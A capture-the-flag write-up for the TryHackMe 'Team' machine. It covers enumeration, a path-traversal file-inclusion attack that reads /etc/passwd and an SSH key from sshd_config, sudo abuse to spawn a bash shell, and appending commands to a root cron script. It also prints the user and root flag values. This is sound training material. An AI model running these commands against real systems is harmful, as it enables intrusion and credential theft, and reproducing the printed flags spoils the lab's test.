# TryHackMe - Team

## General Information

- **Target Machine:** Team
- **Target IP:** 10.65.164.232
- **Platform:** TryHackMe
- **Operating System:** Linux (Ubuntu)
- **Difficulty:** Medium
- **Objectives:** Web enumeration, Local File Inclusion (LFI) exploitation, SSH initial access, lateral movement, and root privilege escalation.

---

## 1. Port Scanning & Reconnaissance

### Initial Nmap Scan

```bash
nmap -sV -sC -T4 10.65.164.232 -oN nmap_initial.txt
```

### Scan Results

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

---

## 2. Web & Virtual Host Enumeration

### Host Resolution Configuration

Based on the default Apache page header mentioning the domain, the following entry was added to `/etc/hosts`:

```text
10.65.164.232 team.thm dev.team.thm
```

### Virtual Host Fuzzing with Gobuster / FFUF

```bash
gobuster vhost -u http://team.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -o gobuster_vhost.txt
```

Discovered development virtual host:
- `dev.team.thm`

### Directory Enumeration on `team.thm`

```bash
gobuster dir -u http://team.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

Discovered assets and endpoints:
- `/images/`
- `/assets/`
- `/scripts/`
- `/robots.txt` (contains reference to user `dale`)

---

## 3. Vulnerability Discovery & LFI Exploitation

Inspecting `dev.team.thm` revealed the `page` parameter in `script.php`:

```php
<?php   
$file = $_GET['page'];
if(isset($file)) {
    include("$file");
} else {
    include("teamshare.php");
}
?>
```

### Path Traversal & File Disclosure

The parameter is concatenated directly into `include()` without sanitization:

```bash
curl -H "Host: dev.team.thm" "http://10.65.164.232/script.php?page=../../../../../../../../etc/passwd"
```

Relevant users identified in `/etc/passwd`:
- `dale`
- `gyles`
- `ftpuser`

### User Flag Retrieval

```bash
curl -H "Host: dev.team.thm" "http://10.65.164.232/script.php?page=../../../../../../../../home/dale/user.txt"
```

> **User Flag:** `THM{6Y0TXHz7c2d}`

### SSH Private Key Recovery

Checking standard configuration files through LFI revealed Dale's private RSA key stored inside comments of `/etc/ssh/sshd_config`:

```bash
curl -H "Host: dev.team.thm" "http://10.65.164.232/script.php?page=../../../../../../../../etc/ssh/sshd_config"
```

---

## 4. Initial Access (SSH)

The private key was saved locally, permissioned appropriately, and used to log in as `dale`:

```bash
chmod 600 id_rsa_dale
ssh -i id_rsa_dale dale@10.65.164.232
```

---

## 5. Privilege Escalation

### Lateral Escalation: `dale` -> `gyles`

Checking `sudo` privileges for `dale`:

```bash
sudo -l
```

Resulting permission:
```text
(gyles) NOPASSWD: /home/gyles/admin_checks
```

Executing the script interactively allows spawning a shell as `gyles`:

```bash
echo -e 'test\n/bin/bash' | sudo -u gyles /home/gyles/admin_checks
```

Checking groups for `gyles`:
```bash
id
# uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),108(lxd),1003(editors),1004(admin)
```

### Vertical Escalation: `gyles` -> `root`

User `gyles` is a member of the `admin` group. A backup script executed by root's cron table (`/usr/local/bin/main_backup.sh`) is group-writable by `admin`:

```bash
echo "cat /root/root.txt > /tmp/root_flag.txt && chmod 777 /tmp/root_flag.txt" >> /usr/local/bin/main_backup.sh
```

After the cron task executed:

```bash
cat /tmp/root_flag.txt
```

> **Root Flag:** `THM{fhqbznavfonq}`

---

## 6. Summary of Flags

| Flag | Method / Location | Value |
| :--- | :--- | :--- |
| **User Flag** | `/home/dale/user.txt` (via LFI) | `THM{6Y0TXHz7c2d}` |
| **Root Flag** | `/root/root.txt` (via Writable Cron) | `THM{fhqbznavfonq}` |

---

## 7. Lessons Learned

1. **Development Subdomain Exposure:** Development virtual hosts frequently contain unvalidated inputs and debugging features.
2. **Credential Storage in Config Comments:** Sensitive keys and credentials must never be retained within comments or documentation on server filesystems.
3. **Cron Job Script Permissions:** Scripts executed by `root` via cron must have strict write restrictions (`chmod 700` or owned solely by `root:root`).
